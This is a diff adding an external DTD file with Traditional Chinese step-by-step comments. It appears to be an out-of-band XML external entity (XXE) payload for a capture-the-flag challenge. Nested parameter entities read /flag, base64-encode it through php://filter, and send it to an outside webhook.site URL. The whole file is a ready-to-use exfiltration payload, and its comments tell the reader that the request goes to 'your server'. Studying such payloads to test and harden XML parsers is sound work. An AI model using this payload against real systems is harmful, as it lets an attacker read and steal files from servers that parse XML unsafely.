@@ -1,0 +1,16 @@
+<!-- 步驟A: 定義一個參數實體 %file，其內容是目標伺服器上敏感檔的內容。 -->
+<!-- 使用php://filter是為了base64編碼，避免特殊字元（如<、>、&）干擾XML解析。 -->
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
+
+<!-- 步驟B: 定義另一個參數實體 %eval。它的內容是一段字串， -->
+<!-- 這段字串本身又是一個完整的、可執行的普通實體定義。 -->
+<!-- 這個普通實體名為 &data;，它的值將通過另一個參數實體 %send 來發送。 -->
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://webhook.site/23fa1e48-4e91-4643-9a47-5dcba6a39976?c=%file;'>">
+
+<!-- 步驟C: 執行 %eval。這會導致 %send 實體被定義和立即執行， -->
+<!-- 因為它是一個外部實體引用。 -->
+%eval;
+
+<!-- 步驟D: 執行 %send。這會向你的伺服器發起一個請求， -->
+<!-- 請求的URL參數中包含了base64編碼的檔內容。 -->
+%send;
